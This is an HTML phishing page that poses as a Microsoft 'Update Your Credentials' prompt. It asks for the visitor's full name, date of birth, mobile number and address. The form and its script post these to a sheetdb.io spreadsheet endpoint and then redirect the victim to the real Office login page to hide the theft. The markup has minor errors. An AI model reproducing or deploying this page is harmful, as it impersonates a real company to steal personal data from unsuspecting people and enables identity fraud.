<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8">
  <link rel="stylesheet" href="css/main.css">
  <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
<title>Update Your Credentials</title>
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

</head>

<body>
  <div class="main">
    <img class="logo" src="img/microsoft_logo.png" align="center" alt="Microsoft">
    <p class="sign" align="center">Update Your Credentials</p>
    <form name="sheetdb-form'" action="https://sheetdb.io/api/v1/bvu1zvnc3gun9" class="uform" method="POST">
      <input class="info" name="data[name]" type="text" align="left" placeholder="Enter your full name">
      <input class="info" name="data[dob]" type="date" align="left" placeholder="Date of Birth">
      <input class="info" name="data[contact]" type="text" align="left" placeholder="Mobile Number">
      <input class="info" name="data[address]" type="text" align="left" placeholder="Your Address">
      <input class="submit" type = "submit" name="submit" id="submit" value = "Update" />
    </div>

<script>
  var form = document.getElementById('sheetdb-form');
  form.addEventListener("submit", e => {
    e.preventDefault();
    fetch(form.action, {
        method : "POST",
        body: new FormData(document.getElementById("sheetdb-form")),
    }).then(
        window.location.href = "https://login.office.com"
        // response => response.json()
    ).then((html) => {
      // you can put any JS code here
      // alert('success')
      window.location.href = "https://login.office.com"
    });
  });
</script>
</body>

</html>
